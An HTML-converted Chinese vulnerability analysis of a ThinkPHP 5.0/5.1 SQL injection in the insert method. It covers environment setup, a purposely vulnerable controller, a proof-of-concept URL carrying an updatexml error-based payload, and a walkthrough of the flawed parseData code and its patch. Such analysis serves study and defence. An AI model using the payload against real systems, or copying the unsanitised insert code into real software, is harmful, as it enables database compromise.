<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>5.0.13 &lt;= Thinkphp &lt;= 5.0.15 &amp; 5.1.0 &lt;= Thinkphp &lt;= 5.1.5</h1><h2>一、漏洞简介</h2><p>本篇文章，将分析 <strong>ThinkPHP</strong> 中存在的 <strong>SQL注入</strong> 漏洞（ <strong>insert</strong> 方法注入）。本次漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2>二、漏洞影响</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p><h2>三、复现过程</h2><p>通过以下命令获取测试环境代码：</p><p>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</p><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><p>"require": {<br />    "php": "&gt;=5.4.0",<br />    "topthink/framework": "5.0.15"<br />}</p><p>然后执行 composer update ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p><p>&lt;?php<br />namespace app\index\controller;<br /><br />class Index<br />{<br />    public function index()<br />    {<br />        $username = request()-&gt;get('username/a');<br />        db('users')-&gt;insert(['username' =&gt; $username]);<br />        return 'Update success';<br />    }<br />}</p><p>在 <strong>application/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>application/config.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p><p>create database tpdemo;<br />use tpdemo;<br />create table users(<br />    id int primary key auto_increment,<br />    username varchar(50) not null<br />);</p><h3>poc</h3><p>http://0-sec.org/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</p><p>访问链接，即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p><p>1.png</p><h3>漏洞分析</h3><p>2.png</p><p>首先在官方发布的 <strong>5.0.16</strong> 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 <strong>commit</strong> 记录，发现其修改的 <strong>Builder.php</strong> 文件代码比较可疑。</p><p>3.png</p><p>接着我们直接跟着上面的攻击 <strong>payload</strong> 来看看漏洞原理。首先， <strong>payload</strong> 数据经过 <strong>ThinkPHP</strong> 内置方法的过滤后（不影响我们的 <strong>payload</strong> ），直接进入了 <strong>$this-&gt;builder</strong> 的 <strong>insert</strong> 方法，这里的 <strong>$this-&gt;builder</strong> 为 <strong>\think\db\builder\Mysql</strong> 类，代码如下：</p><p>4.png</p><p>而 <strong>Mysql</strong> 类继承于 <strong>Builder</strong> 类，即上面的 <strong>$this-&gt;builder-&gt;insert()</strong> 最终调用的是 <strong>Builder</strong> 类的 <strong>insert</strong> 方法。在 <strong>insert</strong> 方法中，我们看到其调用 <strong>parseData</strong> 方法来分析并处理数据，而 <strong>parseData</strong> 方法直接将来自用户的数据 <strong>$val</strong> 进行了拼接返回。我们的恶意数据存储在 <strong>$val[1]</strong> 中，虽经过了 <strong>parseKey</strong> 方法处理，当丝毫不受影响，因为该方法只是用来解析处理数据的，并不是清洗数据。</p><p>5.png</p><p>上面，我们看到直接将用户数据进行拼接。然后再回到 <strong>Builder</strong> 类的 <strong>insert</strong> 方法，直接通过替换字符串的方式，将 <strong>$data</strong> 填充到 <strong>SQL</strong> 语句中，进而执行，造成 <strong>SQL注入漏洞</strong> 。</p><p>6.png</p><p>至此，我们已将整个漏洞分析完了。实际上，上面的 <strong>switch</strong> 结构中，3种情况返回的数据都有可能造成 <strong>SQL</strong> 注入漏洞，但是在观察 <strong>ThinkPHP</strong> 官方的修复代码中，发现其只对 <strong>inc</strong> 和 <strong>dec</strong> 进行了修复，而对于 <strong>exp</strong> 的情况并未处理，这是为什么呢？</p><p>实际上， <strong>exp</strong> 的情况早在传入 <strong>insert</strong> 方法前就被 <strong>ThinkPHP</strong> 内置过滤方法给处理了，如果数据中存在 <strong>exp</strong> ，则会被替换成 <strong>exp空格</strong> ，这也是为什么 <strong>ThinkPHP</strong> 官方没有对 <strong>exp</strong> 的情况进行处理的原因了。具体内置过滤方法的代码如下：</p><p>7.png</p><h3>漏洞修复</h3><p>8.png</p><h3>攻击总结</h3><p>最后，再通过一张攻击流程图来回顾整个攻击过程。</p><p>9.png</p><h2>参考链接</h2><p>https://github.com/Mochazz/ThinkPHP-Vuln</p></body></html>